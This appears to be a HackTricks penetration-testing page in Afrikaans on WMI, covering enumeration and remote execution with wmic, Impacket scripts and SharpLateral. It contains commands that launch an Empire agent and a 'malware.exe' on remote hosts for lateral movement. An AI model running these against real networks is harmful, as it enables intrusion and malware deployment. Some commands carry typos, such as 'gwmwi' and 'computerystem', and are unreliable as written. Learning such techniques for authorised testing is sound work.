# WmicExec

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Hoe Dit Werk Word Verduidelik

Prosesse kan op gasheer-rekenaars geopen word waar die gebruikersnaam en óf wagwoord of hasj bekend is deur die gebruik van WMI. Opdragte word uitgevoer met behulp van WMI deur Wmiexec, wat 'n semi-interaktiewe skilervaring bied.

**dcomexec.py:** Deur verskillende DCOM-eindpunte te benut, bied hierdie skrip 'n semi-interaktiewe skil soortgelyk aan wmiexec.py, wat spesifiek die ShellBrowserWindow DCOM-voorwerp benut. Dit ondersteun tans MMC20. Toepassing, Skelmuurvensters, en Skelblaaier-venster-voorwerpe. (bron: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## WMI Fundamentele Beginsels

### Naamruimte

Gestruktureer in 'n gidsstyl-hierargie, is WMI se topvlakhouer \root, waarby addisionele gidse, bekend as name spaces, georganiseer is.
Opdragte om name spaces te lys:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Klasse binne 'n namespace kan gelys word deur gebruik te maak van:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Klasse**

Om 'n WMI-klasnaam te ken, soos win32\_process, en die namespace waarin dit bestaan, is noodsaaklik vir enige WMI-operasie.
Opdragte om klasse te lys wat begin met `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Aanroeping van 'n klas:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Metodes

Metodes, wat een of meer uitvoerbare funksies van WMI-klasse is, kan uitgevoer word.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumerasie

### WMI Diens Status

Opdragte om te verifieer of die WMI-diens operasioneel is:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Stelsel- en Prosesherinligting

Inligting oor stelsels en prosesse word deur WMI ingesamel:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Vir aanvallers is WMI 'n kragtige instrument om sensitiewe data oor stelsels of domeine te ontleed.
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
### **Handmatige Afgeleë WMI-navrae**

Heimlike identifikasie van plaaslike admins op 'n afgeleë rekenaar en aangemelde gebruikers kan bereik word deur spesifieke WMI-navrae. `wmic` ondersteun ook lees vanaf 'n tekslêer om op meerdere nodes gelyktydig opdragte uit te voer.

Om 'n proses oor WMI afgeleë uit te voer, soos die implementering van 'n Empire-agent, word die volgende opdragstruktuur gebruik, met suksesvolle uitvoering aangedui deur 'n terugvoerwaarde van "0":
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Hierdie proses illustreer WMI se vermoë vir afgeleë uitvoering en stelselopsomming, wat sy nuttigheid vir beide stelseladministrasie en indringingstoetsing beklemtoon.


## Verwysings
* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

## Outomatiese Gereedskap

* [**SharpLateral**](https://github.com/mertdas/SharpLateral):

{% code overflow="wrap" %}
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
{% endcode %}

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 

</details>
